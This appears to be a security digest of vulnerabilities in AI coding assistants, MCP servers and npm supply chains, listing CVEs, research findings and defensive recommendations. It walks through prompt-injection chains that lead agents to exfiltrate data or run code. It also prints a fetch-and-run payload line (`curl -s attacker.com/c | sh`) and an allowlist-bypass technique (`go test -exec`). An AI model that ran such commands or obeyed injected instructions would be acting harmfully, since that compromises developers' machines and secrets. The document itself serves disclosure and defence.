## Incidents & Vulnerabilities

### IDEsaster — 30+ Flaws Across All Major AI IDEs (Ongoing, 2025–2026)

Researcher Ari Marzouk documented a class of vulnerabilities affecting **100% of tested AI IDEs and coding assistants**, including Cursor, Windsurf, GitHub Copilot, Kiro.dev, Zed.dev, Roo Code, Junie, and Cline. In total, **24 CVEs were assigned** plus an AWS security advisory (AWS-2025-019).

The attack chain follows three stages: **Prompt Injection → AI Tools → Base IDE Features**. Malicious instructions are injected via rules files, MCP servers, deep links, or filenames; the agent executes filesystem actions; those actions trigger IDE features to achieve RCE or data exfiltration.

#### Selected CVEs

| CVE | Product | Impact | Status |
|-----|---------|--------|--------|
| CVE-2025-53773 (CVSS 9.6) | GitHub Copilot | Zero-click RCE via poisoned email; agent retrieves it, executes embedded instructions, exfiltrates data via image URL | **Patched** |
| CVE-2026-29783 | GitHub Copilot CLI | Arbitrary code execution via dangerous bash shell expansion in the shell tool | **Patched** |
| CVE-2025-64660 | GitHub Copilot | Prompt injection → workspace config override → RCE | **Patched** |
| CVE-2025-61590 | Cursor | Same pattern as CVE-2025-64660 (requires auto-approve enabled) | **Patched** |

### Claude Code — Hooks RCE and API Key Theft (CVE-2025-59536 / CVE-2026-21852)

Check Point Research (published February 2026) found two critical flaws in Claude Code, exploitable when a developer opens any project containing a malicious `.claude/settings.json` or `.mcp.json` file — including honeypot repositories, malicious PRs, and internal enterprise repos.

| CVE | CVSS | Description | Status |
|-----|------|-------------|--------|
| CVE-2025-59536 | **8.7** | Hooks-based RCE fires **before the trust dialog appears**; a second variant abuses config override to auto-approve all MCP servers, also pre-dialog | **Patched** in Claude Code v2.0.65 (Jan 2026) |
| CVE-2026-21852 | 5.3 | Overriding `ANTHROPIC_BASE_URL` in repository config redirects all Claude API traffic — including the `Authorization` header — to an attacker proxy, leaking the full Anthropic API key in plaintext | **Patched** in Claude Code v2.0.65 (Jan 2026) |

A single compromised repository in an enterprise mono-repo can trigger enterprise-wide API key compromise. Disclosure ran from October 2025 to January 2026.

Sources: [Check Point Research](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/) · [The Register](https://www.theregister.com/2026/02/26/clade_code_cves/) · [Dark Reading](https://www.darkreading.com/application-security/flaws-claude-code-developer-machines-risk)

### Trail of Bits — Argument Injection to RCE via Whitelisted Commands (October 2025)

Trail of Bits demonstrated one-shot RCE across three popular (unnamed) CLI-based AI agents by exploiting pre-approved commands. No single CVE was assigned; the finding applies generically to any allow-list-based command filtering system.

Techniques:
- `go test -exec <binary>` — runs an arbitrary binary without triggering the allowlist since `go test` is approved
- `git show` and `ripgrep` — accept arguments that enable file write and execution with no filtering

Payloads work when embedded in code comments, agentic rule files, GitHub repos, and log output. Trail of Bits concluded that **allowlist-based command filtering is architecturally unenforceable without sandboxing** and recommends container-based or OS-level sandboxing as the only viable fix.

Sources: [Trail of Bits](https://blog.trailofbits.com/2025/10/22/prompt-injection-to-rce-in-ai-agents/)

### Devin AI (Cognition Labs) — No Prompt Injection Defenses (Disclosed April 2025, Unfixed)

Researcher Johann Rehberger found Devin completely undefended against prompt injection. Exploits demonstrated:

- Arbitrary malware download and execution via poisoned GitHub issue ("ZombAI")
- Exposing local ports to the public internet via Devin's built-in tunnel tool
- Credential and access token leakage
- Image-based data exfiltration via rendering untrusted image URLs in chat
- Full DevBox compromise from unsupervised Slack integration

**Reported April 6, 2025. No fix or coordinated disclosure response after 120+ days. No CVE assigned.** As of March 2026, Devin has not issued a public advisory.

Sources: [Embrace The Red — ZombAI](https://embracethered.com/blog/posts/2025/devin-i-spent-usd500-to-hack-devin/) · [Embrace The Red — Kill Chain](https://embracethered.com/blog/posts/2025/devin-ai-kill-chain-exposing-ports/) · [Embrace The Red — Secrets](https://embracethered.com/blog/posts/2025/devin-can-leak-your-secrets/)

## Supply Chain

### MCP Infrastructure — 30 CVEs in 60 Days (January–February 2026)

Security researchers filed over 30 CVEs against MCP servers, clients, and tooling between January and February 2026. Root causes: missing input validation, absent authentication, and blind trust in tool descriptions. A survey of 2,614 MCP implementations found **82% have file operations vulnerable to path traversal**.

#### Key MCP CVEs

| CVE | Component | CVSS | Impact | Status |
|-----|-----------|------|--------|--------|
| CVE-2025-6514 | `mcp-remote` (437k+ downloads) | **9.6** | OS command injection when connecting to untrusted MCP servers; first documented real-world MCP RCE | **Patched** |
| CVE-2025-68145 | Anthropic `mcp-server-git` | — | Path validation bypass (component of RCE chain below) | **Patched** |
| CVE-2025-68143 | Anthropic `mcp-server-git` | — | Unrestricted `git_init` re-initializes arbitrary directories as git repos (e.g., `~/.ssh`) | **Patched** |
| CVE-2025-68144 | Anthropic `mcp-server-git` | — | Argument injection in `git_diff` → chained with above → full RCE via malicious `.git/config` | **Patched** |
| CVE-2026-23744 | MCPJam Inspector ≤ 1.4.2 | **9.8** | Zero-interaction RCE; listens on `0.0.0.0` with no auth; crafted HTTP request executes arbitrary commands | **Patched** in v1.4.3 |
| CVE-2026-25536 | `@modelcontextprotocol/sdk` v1.10.0–1.25.3 | 7.1 | Cross-client data leak in multi-client stateless deployments; misroutes responses between authenticated sessions | **Patched** in v1.26.0 |

#### Tool Poisoning / "Rug Pull"

MCP tool definitions can mutate after installation. A safe-looking tool approved at install time can silently reroute API keys or execute new commands days later. Academic analysis of 67,057 MCP servers found a substantial portion susceptible due to absent vetting in public registries.

#### Smithery Platform — Docker Build Path Traversal

A `dockerBuildPath: ".."` entry in `smithery.yaml` leaked `~/.docker/config.json`, including a Fly.io API token controlling 3,000+ apps. **Unpatched as of reporting.**

Sources: [Vulnerable MCP Project](https://vulnerablemcp.info/) · [AuthZed Timeline](https://authzed.com/blog/timeline-mcp-breaches) · [Unit 42 — MCP Sampling Attack Vectors](https://unit42.paloaltonetworks.com/model-context-protocol-attack-vectors/) · [Practical DevSecOps](https://www.practical-devsecops.com/mcp-security-vulnerabilities/)

### Slopsquatting — Hallucinated Package Names as Attack Vectors

Research analyzing 576,000 Python and JavaScript samples across 16 models (published March 2025, ongoing risk as of 2026):

| Metric | Finding |
|--------|---------|
| Hallucinated package rate (open-source models) | ~**20%** of recommendations |
| Hallucinated package rate (GPT-4) | ~**5%** |
| Unique hallucinated package names identified | **200,000+** |
| Hallucinations that repeat across multiple runs | **58%** |
| Hallucinations that repeat consistently across prompts | **43%** |
| AI-suggested dependency versions with known vulns (Endor Labs) | **44–49%** |

Attackers register hallucinated names on PyPI or npm. Any developer who trusts AI output and runs `pip install` / `npm install` executes the payload. Sonatype's 2026 State of the Software Supply Chain Report found **28% of LLM-hallucinated versions** present in real AI-assisted projects.

Sources: [BleepingComputer](https://www.bleepingcomputer.com/news/security/ai-hallucinated-code-dependencies-become-new-supply-chain-risk/) · [The Register](https://www.theregister.com/2025/04/12/ai_code_suggestions_sabotage_supply_chain/) · [Rescana](https://www.rescana.com/post/ai-hallucinated-dependencies-in-pypi-and-npm-the-2025-slopsquatting-supply-chain-risk-explained/)

### npm Supply Chain Worms — Shai-Hulud and s1ngularity (2025)

#### s1ngularity (August 2025)
Malicious versions of the Nx build system published to npm. Payload collected cryptocurrency wallets, GitHub/npm tokens, and SSH keys. Over **1,000 valid GitHub tokens** and **~20,000 files** stolen.

#### Shai-Hulud (September 2025)
Worm trojanized **40+ npm packages** including `@ctrl/tinycolor`. Payload used TruffleHog to hunt for secrets, validated credentials, and abused npm/GitHub tokens.

#### Shai-Hulud 2.0 (November 2025)
Significantly wider scope — **25,000+ malicious GitHub repositories** across ~350 unique users. Added a destructive fallback: if credential theft fails, malware **overwrites and deletes all writable files in the victim's home directory**. Unit 42 noted AI-generated code in the payload (LLM-style comments and emoji patterns).

Scale context: Sonatype tracked **454,648 new malicious packages in 2025**; 99% on npm; 9.8 trillion total downloads.

Sources: [InfoQ](https://www.infoq.com/news/2025/10/npm-s1ngularity-shai-hulud/) · [Unit 42 — Shai-Hulud](https://unit42.paloaltonetworks.com/npm-supply-chain-attack/) · [Oligo Security](https://www.oligo.security/blog/the-hidden-risks-of-the-npm-supply-chain-attacks-ai-agents)

### Rules File Backdoor — Invisible Unicode in AI Config Files (March 2025)

Attackers embed invisible Unicode characters in `.cursorrules`, `.windsurfrules`, and similar AI config files to conceal malicious instructions from human reviewers. Developers treat these files as passive metadata, so they rarely receive code review. Demonstrated payload: `curl -s attacker.com/c | sh` executed before every code review action.

Academic analysis (arXiv 2601.17548) confirms that a Cursor skill with Read access can read any file on the system — skill definitions specify tool types but not targets.

Sources: [The Hacker News — Rules File Backdoor](https://thehackernews.com/2025/03/new-rules-file-backdoor-attack-lets.html) · [arXiv 2601.17548](https://arxiv.org/html/2601.17548v1)

## Research & Advisories

### MDPI: Prompt Injection in LLM Systems — Systematic Review (January 2026)

Meta-analysis synthesizing 78 studies (2021–2026):

- Prompt injection ranked **#1 in OWASP LLM Top 10**; present in >73% of audited production deployments
- Attack success rates against state-of-the-art defenses **exceed 85%** when adaptive strategies are employed
- No complete fix exists — even frontier models (OpenAI, Google, Anthropic) remain vulnerable after applying best defenses
- OpenAI has publicly acknowledged prompt injection "may never be fully solved" at the model level

Source: [MDPI Information (Jan 2026)](https://www.mdpi.com/2078-2489/17/1/54)

### ACM TOSEM: Security Weaknesses in AI-Generated Code

Empirical study of 733 code snippets from GitHub Copilot, CodeWhisperer, and Codeium:

- Security weaknesses in **29.5% of Python snippets** and **24.2% of JavaScript snippets**
- Veracode independently finds **45%** of AI-generated code contains security flaws
- Aikido Security (2026): AI-generated code is the cause of **1 in 5 breaches**
- Fewer than **50% of developers** review AI-generated code before committing (Sonar survey)

Source: [ACM TOSEM](https://dl.acm.org/doi/10.1145/3716848)

### Defensive Recommendations

| Layer | Action |
|-------|--------|
| Claude Code | Run v2.0.65+; treat any cloned repository as potentially malicious; audit `.claude/settings.json` and `.mcp.json` files before opening projects |
| All AI IDEs | Treat allowlist/auto-approve mode as a UX convenience, not a security boundary; disable auto-approve for production workstations |
| MCP servers | Upgrade `@modelcontextprotocol/sdk` to v1.26.0; require auth + TLS on all endpoints; audit against [Vulnerable MCP Project](https://vulnerablemcp.info/) |
| MCPJam Inspector | Upgrade to v1.4.3+; bind explicitly to `127.0.0.1`; add authentication |
| Package management | Verify all AI-recommended packages exist before installing; use private registry proxies with age and reputation filters |
| Code review | Establish a policy requiring manual review of all AI-generated code before merge; scan with SAST tooling |
| Architecture | Apply least-privilege to all agent tool grants; sandbox file-write operations to workspace; assume prompt injection is always possible at any trust boundary |
